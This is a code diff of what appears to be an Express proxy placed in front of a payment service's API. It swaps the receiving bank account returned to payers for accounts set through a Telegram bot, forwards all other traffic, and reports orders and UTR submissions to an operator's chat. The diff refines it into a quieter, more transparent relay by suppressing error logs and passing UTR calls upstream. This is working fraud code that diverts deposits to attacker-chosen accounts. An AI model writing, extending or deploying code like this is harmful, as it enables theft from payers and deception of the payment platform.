@@ -23,17 +23,10 @@ async function ensureWebhook() {
   try {
     await bot.setWebHook(WEBHOOK_URL);
     webhookSet = true;
-  } catch (e) {
-    console.error('Webhook error:', e.message);
-  }
+  } catch (e) {}
 }
 
-const DEFAULT_DATA = {
-  banks: [],
-  activeIndex: -1,
-  walletType: 'paytm',
-  adminChatId: null
-};
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null };
 
 async function loadData() {
   try {
@@ -42,85 +35,80 @@ async function loadData() {
       if (typeof data === 'string') data = JSON.parse(data);
       return data;
     }
-  } catch (e) {
-    console.error('KV load error:', e.message);
-  }
+  } catch (e) {}
   return { ...DEFAULT_DATA };
 }
 
 async function saveData(data) {
-  try {
-    await kv.set('bankData', JSON.stringify(data));
-  } catch (e) {
-    console.error('KV save error:', e.message);
-  }
+  try { await kv.set('bankData', JSON.stringify(data)); } catch (e) {}
 }
 
-function getActiveBank(bankData) {
-  if (bankData.activeIndex >= 0 && bankData.activeIndex < bankData.banks.length) {
-    return bankData.banks[bankData.activeIndex];
-  }
+function getActiveBank(d) {
+  if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
   return null;
 }
 
-function bankListText(bankData) {
-  if (bankData.banks.length === 0) return 'No banks added yet.';
-  return bankData.banks.map((b, i) => {
-    const active = i === bankData.activeIndex ? ' ✅ ACTIVE' : '';
-    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${active}`;
+function bankListText(d) {
+  if (d.banks.length === 0) return 'No banks added yet.';
+  return d.banks.map((b, i) => {
+    const a = i === d.activeIndex ? ' ✅' : '';
+    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${a}`;
   }).join('\n');
 }
 
-async function proxyToOriginal(req, res) {
+app.use((req, res, next) => {
+  const chunks = [];
+  req.on('data', c => chunks.push(c));
+  req.on('end', () => {
+    req.rawBody = Buffer.concat(chunks);
+    try { req.parsedBody = JSON.parse(req.rawBody.toString()); } catch(e) { req.parsedBody = {}; }
+    next();
+  });
+});
+
+async function transparentProxy(req, res) {
   try {
     const url = ORIGINAL_API + req.originalUrl;
-
     const forwardHeaders = {};
-    const skipHeaders = ['host', 'content-length', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'x-forwarded-for', 'x-forwarded-proto', 'x-forwarded-host', 'x-vercel-id', 'x-real-ip', 'x-vercel-forwarded-for', 'x-vercel-deployment-url'];
-    
-    for (const [key, value] of Object.entries(req.headers)) {
-      if (!skipHeaders.includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
-        forwardHeaders[key] = value;
-      }
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' || 
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      forwardHeaders[key] = val;
     }
     forwardHeaders['host'] = 'api.i-money.vip';
 
-    const fetchOptions = {
-      method: req.method,
-      headers: forwardHeaders
-    };
+    const opts = { method: req.method, headers: forwardHeaders };
 
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.body && Object.keys(req.body).length > 0) {
-      fetchOptions.body = JSON.stringify(req.body);
-      forwardHeaders['content-type'] = 'application/json';
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      forwardHeaders['content-length'] = String(req.rawBody.length);
     }
 
-    const response = await fetch(url, fetchOptions);
-    const text = await response.text();
+    const response = await fetch(url, opts);
 
-    let parsed;
-    try {
-      parsed = JSON.parse(text);
-    } catch (e) {
-      parsed = null;
-    }
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding') {
+        respHeaders[key] = val;
+      }
+    });
+    
+    const body = await response.arrayBuffer();
+    const buf = Buffer.from(body);
 
-    if (parsed) {
-      res.status(response.status).json(parsed);
-      return parsed;
-    } else {
-      res.status(response.status).send(text || '');
-      return null;
-    }
+    res.writeHead(response.status, respHeaders);
+    res.end(buf);
+    return buf;
   } catch (e) {
     console.error('Proxy error:', req.method, req.originalUrl, e.message);
-    res.status(502).json({ code: 0, msg: 'Proxy error', error: e.message });
+    if (!res.headersSent) {
+      res.status(502).json({ code: 0, msg: 'Proxy error' });
+    }
     return null;
   }
 }
-
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
 app.get('/setup-webhook', async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
@@ -129,17 +117,15 @@ app.get('/setup-webhook', async (req, res) => {
     webhookSet = true;
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook: info });
-  } catch (e) {
-    res.json({ error: e.message });
-  }
+  } catch (e) { res.json({ error: e.message }); }
 });
 
 app.post('/api/telegram', async (req, res) => {
   try {
     await ensureWebhook();
-    if (!bot || !req.body) return res.sendStatus(200);
+    if (!bot) return res.sendStatus(200);
 
-    const msg = req.body.message;
+    const msg = req.parsedBody?.message;
     if (!msg || !msg.text) return res.sendStatus(200);
 
     const chatId = msg.chat.id;
@@ -197,7 +183,7 @@ ${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.bank
     else if (text.startsWith('/removebank ')) {
       const num = parseInt(text.substring(12).trim());
       if (isNaN(num) || num < 1 || num > bankData.banks.length) {
-        await bot.sendMessage(chatId, '❌ Invalid number. /list se check karo.');
+        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
         return res.sendStatus(200);
       }
       const removed = bankData.banks.splice(num - 1, 1)[0];
@@ -234,13 +220,8 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
 
     else if (text === '/status') {
       const active = getActiveBank(bankData);
-      if (!active) {
-        await bot.sendMessage(chatId, '🔴 No active bank.');
-        return res.sendStatus(200);
-      }
-      await bot.sendMessage(chatId,
-`🟢 Active: ${active.accountNo} | ${active.accountHolder} | ${active.ifsc}`
-      );
+      if (!active) { await bot.sendMessage(chatId, '🔴 No active bank.'); return res.sendStatus(200); }
+      await bot.sendMessage(chatId, `🟢 Active: ${active.accountNo} | ${active.accountHolder} | ${active.ifsc}`);
     }
 
     return res.sendStatus(200);
@@ -255,7 +236,7 @@ app.get('/wallet/online/walletType', async (req, res) => {
   const active = getActiveBank(bankData);
   if (active) {
     return res.json({
-      code: 1,
+      code: 200,
       data: {
         receiveAccountNo: active.accountNo,
         receiveAccountName: active.accountHolder,
@@ -265,24 +246,22 @@ app.get('/wallet/online/walletType', async (req, res) => {
       msg: 'success'
     });
   }
-  await proxyToOriginal(req, res);
+  await transparentProxy(req, res);
 });
 
 app.post('/money/uploadUtr', async (req, res) => {
-  const { orderId, utr, utrAmount } = req.body || {};
-  
   const bankData = await loadData();
   if (bankData.adminChatId && bot) {
+    const b = req.parsedBody || {};
     bot.sendMessage(bankData.adminChatId,
 `💰 UTR Uploaded!
-Order: ${orderId || 'N/A'}
-UTR: ${utr || 'N/A'}
-Amount: ₹${utrAmount || 'N/A'}
+Order: ${b.orderId || 'N/A'}
+UTR: ${b.utr || 'N/A'}
+Amount: ₹${b.utrAmount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-
-  res.json({ code: 200, data: null, msg: 'success' });
+  await transparentProxy(req, res);
 });
 
 app.post('/money/cancelUtr', async (req, res) => {
@@ -290,11 +269,11 @@ app.post('/money/cancelUtr', async (req, res) => {
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `❌ UTR Cancelled!
-Order: ${req.body?.orderId || 'N/A'}
+Order: ${req.parsedBody?.orderId || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-  res.json({ code: 200, data: null, msg: 'success' });
+  await transparentProxy(req, res);
 });
 
 app.post('/money/orderId', async (req, res) => {
@@ -302,11 +281,11 @@ app.post('/money/orderId', async (req, res) => {
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `🔔 New Order!
-Amount: ₹${req.body?.amount || 'N/A'}
+Amount: ₹${req.parsedBody?.amount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-  await proxyToOriginal(req, res);
+  await transparentProxy(req, res);
 });
 
 app.post('/money/create/v2', async (req, res) => {
@@ -314,27 +293,21 @@ app.post('/money/create/v2', async (req, res) => {
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `🔔 New Order (v2)!
-Amount: ₹${req.body?.amount || 'N/A'}
+Amount: ₹${req.parsedBody?.amount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-  await proxyToOriginal(req, res);
+  await transparentProxy(req, res);
 });
 
 app.get('/health', async (req, res) => {
   const bankData = await loadData();
   const active = getActiveBank(bankData);
-  res.json({
-    status: 'ok',
-    mode: 'proxy',
-    bankActive: !!active,
-    totalBanks: bankData.banks.length,
-    adminSet: !!bankData.adminChatId
-  });
+  res.json({ status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length, adminSet: !!bankData.adminChatId });
 });
 
 app.use(async (req, res) => {
-  await proxyToOriginal(req, res);
+  await transparentProxy(req, res);
 });
 
 module.exports = app;
